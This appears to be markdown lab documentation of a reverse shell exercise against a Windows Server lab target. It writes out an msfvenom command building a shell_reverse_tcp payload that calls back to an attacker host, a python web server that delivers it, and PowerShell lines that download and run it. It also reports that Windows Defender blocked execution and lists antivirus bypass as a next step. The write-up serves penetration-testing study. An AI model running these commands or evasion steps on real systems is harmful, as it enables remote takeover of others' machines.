# 🔥 Reverse Shell Payload Deployment Attempt — Lab Documentation

## 🧪 Objective
Simulate remote code execution (RCE) on a Windows Server 2025 target by crafting and delivering a reverse shell payload from a Kali Linux attacker machine.

---

## 🧠 Attacker Setup (Kali Linux)

**IP Address:** `192.168.1.3`  
**Payload Type:** `windows/x64/shell_reverse_tcp`  
**Listener:** Metasploit handler on port `4444`

### Payload Generation (msfvenom):
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.3 LPORT=4444 -f exe -o revshell.exe
```

### HTTP Server to Deliver Payload:
```bash
sudo python3 -m http.server 80
```

---

## 🧾 Download & Execution Attempt on Target (Windows Server)

### PowerShell Commands Used:
```powershell
Invoke-WebRequest -Uri http://192.168.1.3/revshell.exe -OutFile C:\Users\Public\revshell.exe
Start-Process C:\Users\Public\revshell.exe
```

---

## ❗ Result

- File was **successfully downloaded** to the Windows Server.
- **Execution was blocked by Windows Defender** with the following error:
  > "Operation did not complete successfully because the file contains a virus or potentially unwanted software."

---

## ✅ Achievements

- Confirmed **network connectivity**
- Validated **Metasploit listener was active**
- Successfully **transferred payload**
- Simulated **real-world AV detection** response

---

## 📌 Next Steps

- Test **Defender bypass** using encoded `msfvenom` payload
- Attempt **payload execution after disabling Defender** (lab safe mode)
- Begin **post-exploitation** (enumeration + privilege escalation)
